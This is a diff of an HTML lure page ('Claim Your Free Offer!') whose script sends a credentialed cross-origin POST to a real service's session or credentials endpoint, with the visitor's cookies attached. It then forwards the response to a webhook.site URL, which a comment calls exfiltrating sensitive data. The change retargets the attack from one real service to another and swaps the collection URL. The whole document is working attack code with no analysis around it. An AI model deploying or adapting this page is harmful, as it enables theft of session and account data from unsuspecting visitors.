@@ -8,7 +8,7 @@
   <h1>Claim Your Free Offer!</h1>
   <script>
     var req = new XMLHttpRequest();
-    req.open('POST', 'https://cloudaccess.svc.ui.com/create-credentials', true);
+    req.open('POST', 'https://account.proton.me/api/auth/v4/sessions', true);
     req.withCredentials = true; // Send cookies
     req.setRequestHeader('Content-Type', 'application/json'); // Ensures request is accepted
     req.send('{}'); // Sending an empty JSON body
@@ -17,7 +17,7 @@
       if (req.status === 200) {
         // Exfiltrate sensitive data to an external server
         var exfil = new XMLHttpRequest();
-        exfil.open("GET", "https://webhook.site/31f77ac0-e4dc-48c1-84e2-3c2dbd73a717?data=" + encodeURIComponent(req.responseText), true);
+        exfil.open("GET", "https://webhook.site/9fa37894-98f2-4720-bb76-889436386bdb?data=" + encodeURIComponent(req.responseText), true);
         exfil.send();
       } else {
         console.error("Request failed with status: " + req.status);
